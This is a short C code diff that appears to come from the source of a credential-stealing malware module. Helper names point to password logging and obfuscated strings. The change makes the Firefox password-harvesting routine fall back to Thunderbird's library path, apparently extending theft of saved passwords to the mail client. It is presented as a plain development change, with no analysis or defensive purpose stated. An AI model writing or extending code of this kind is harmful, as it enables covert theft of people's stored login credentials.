@@ -16,6 +16,7 @@
 extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
 extern char *LOG_ScrambleName(char *string, BYTE scramble, BOOL crypt);
 extern char *HM_CompletePath(char *file_name, char *buffer);
+extern WCHAR *GetTBLibPath();
 extern char H4_DUMMY_NAME[];
 
 //Firefox internal SEC structures
@@ -225,8 +226,11 @@ void FireFoxInitFunc()
 	WCHAR *firefoxDir;
 
 	firefoxDir = GetFFLibPath();
-	if (firefoxDir && !DirectoryExists(firefoxDir)) 
-		return;
+	if (!firefoxDir || !DirectoryExists(firefoxDir)) {
+		firefoxDir = GetTBLibPath();
+		if (!firefoxDir || !DirectoryExists(firefoxDir))
+			return;
+	}
 
 	if (!libcrt) {
 		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(MOZCRT_LIBRARY_NAME));
